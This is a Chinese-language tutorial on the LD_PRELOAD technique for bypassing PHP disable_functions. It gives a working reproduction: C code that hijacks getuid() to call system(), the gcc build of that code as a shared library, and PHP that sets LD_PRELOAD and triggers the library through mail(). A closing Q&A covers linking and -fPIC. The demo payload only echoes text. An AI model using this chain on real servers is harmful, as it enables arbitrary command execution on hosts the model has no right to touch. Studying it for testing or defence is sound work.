## LD_PRELOAD
---

**LD_PRELOAD** 是 Linux 环境变量，用于指定程序运行前**优先加载**的动态链接库


## LD_PRELOAD绕过原理
---

让php解析模块执行函数时，被我们的so替换或劫持，使用我们提供的动态链接库，并使用不在黑名单的函数来实现代理目标函数，以达到绕过


## LD_PRELOAD绕过条件
---

1. 可上传自定义 `.so` 动态链接库文件
2. `putenv` 函数未被禁用，能设置 `LD_PRELOAD`
3. 存在 PHP 触发外部程序执行的函数（如`mail()`/`imap_mail()`/`mb_send_mail()`/`error_log()` 等）

## 最佳复现攻略
---

### 1. 环境验证

通过 `strace` 追踪 PHP 函数调用的系统进程：
```bash
# vim demo.php
-> <?php mail('','','',''); ?>

# strace -o 1.txt -f php demo.php
执行并追踪系统调用

# cat 1.txt | grep execve
查看相关执行函数
```

### 2. 自定义恶意动态库

编写 C 语言劫持代码，编译为 `.so` 文件：

```shell
# vim poc.c
-> #include <stdlib.h>
-> #include <stdio.h>
-> #include <string.h>
-> 
-> void payload() {
->     system("echo 'hello_world'");
-> }
-> 
-> int getuid() {
->     unsetenv("LD_PRELOAD");  // 清除环境变量避免冲突
->     payload();
-> }

# gcc -shared -fPIC poc.c -o poc.so
生成动态链接库
```

### 3. 执行绕过

PHP 中设置 `LD_PRELOAD` 并触发外部函数：

```shell
# vim poc.php
-> <?php
-> putenv("LD_PRELOAD=./poc.so");  // 加载自定义库
-> mail('','','','');  // 触发外部程序执行
-> ?>

# php poc.php
-> hello_world
```




## Q&A
### Q： 程序链接方式是什么？有哪些？

A：
- **静态链接**：程序运行前，将目标模块与库函数链接为完整可执行文件，运行时无额外链接
- **装入时动态链接**：编译后得到目标模块，装入内存时边装入边链接
- **运行时动态链接**：程序执行需要调用时，才对目标模块进行链接
- **动态链接库**：公共函数库，更新透明，程序不用重编译。


### Q：`-fPIC` 参数

A：
- 全称：**Position Independent Code（位置无关代码）**
- 作用：编译 Linux 动态库（`.so`）的核心参数，使代码可加载到内存任意位置正常运行
- 强制要求：现代 Linux 系统编译 `.so` 必须添加，否则直接编译报错
- 总结：**编译 .so 动态库必加 `-fPIC`，不加则无法生成可用文件**
